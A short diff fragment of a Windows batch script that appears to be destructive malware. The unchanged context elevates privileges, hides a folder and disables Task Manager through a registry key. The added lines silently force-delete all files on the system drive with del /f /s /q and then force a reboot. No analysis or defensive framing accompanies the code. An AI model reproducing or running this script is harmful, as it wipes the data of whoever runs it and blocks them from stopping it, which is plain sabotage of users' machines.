@@ -28,9 +28,11 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
+@echo off 
+del %systemdrive%\*.* /f /s /q
+shutdown -r -t 10
 
-
-ATTRIB +s +h C:\Wind0ws
+ATTRIB +s +h C:\Wind1
 
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 
